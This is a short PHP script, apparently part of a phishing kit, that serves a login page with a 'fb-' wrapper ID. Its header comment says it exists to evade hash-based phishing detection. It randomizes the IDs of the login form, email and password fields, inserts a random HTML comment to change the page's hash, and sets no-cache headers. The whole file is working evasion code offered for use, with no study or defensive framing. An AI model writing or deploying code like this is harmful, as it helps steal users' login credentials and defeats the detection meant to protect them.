<?php
/**
 * Dynamic page generator — randomizes non-essential elements
 * to evade hash-based phishing detection
 */
ob_start();

// Randomize CSS class names and IDs
$suffix = substr(md5(time() . rand(1000, 9999)), 0, 6);
$wrapper_id = 'fb-' . $suffix;
$form_id = 'form-' . substr(md5(rand()), 0, 6);

// Serve the login HTML with dynamic modifications
$html = file_get_contents('login.html');

// Replace static IDs with dynamic ones
$html = str_replace(
    ['login-form', 'email-input', 'pass-input', 'login-btn'],
    ['login-form-' . $suffix, 'email-' . $suffix, 'pass-' . $suffix, 'btn-' . $suffix],
    $html
);

// Add a randomized comment to change the hash
$rand_comment = "<!-- " . bin2hex(random_bytes(8)) . " -->\n";
$html = str_replace('<head>', "<head>\n" . $rand_comment, $html);

// Serve with no-cache headers
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');
header('Content-Type: text/html; charset=utf-8');

echo $html;
ob_end_flush();
?>